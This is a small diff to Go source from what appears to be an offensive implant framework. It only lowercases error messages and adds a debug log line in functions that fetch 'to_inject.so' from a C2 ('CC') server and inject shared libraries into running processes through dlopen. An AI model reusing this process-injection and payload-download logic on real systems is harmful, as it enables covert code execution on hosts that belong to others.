@@ -31,11 +31,11 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 	if !util.IsFileExist(so_path) {
 		out, err := file.ExtractFileFromString(file.LoaderSO_Data)
 		if err != nil {
-			return "", fmt.Errorf("Extract loader.so failed: %v", err)
+			return "", fmt.Errorf("extract loader.so failed: %v", err)
 		}
 		err = os.WriteFile(so_path, out, 0o644)
 		if err != nil {
-			return "", fmt.Errorf("Write loader.so failed: %v", err)
+			return "", fmt.Errorf("write loader.so failed: %v", err)
 		}
 	}
 
@@ -85,7 +85,7 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 	}
 	_, err = SmartDownload("", "to_inject.so", path, checksum)
 	if err != nil {
-		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
+		err = fmt.Errorf("failed to download to_inject.so from CC: %v", err)
 	}
 	return
 }
@@ -150,6 +150,7 @@ func InjectSharedLib(so_path string, pid int) (err error) {
 	if err != nil {
 		log.Printf("failed to get __libc_dlopen_mode address for %d: %v, trying `dlopen`", pid, err)
 	}
+	log.Printf("dlopen_addr: %v", dlopen_addr)
 	dlopen_addr, err = exe_utils.GetSymFromLibc(pid, "dlopen")
 	if err != nil {
 		return fmt.Errorf("failed to get dlopen address for %d: %v", pid, err)
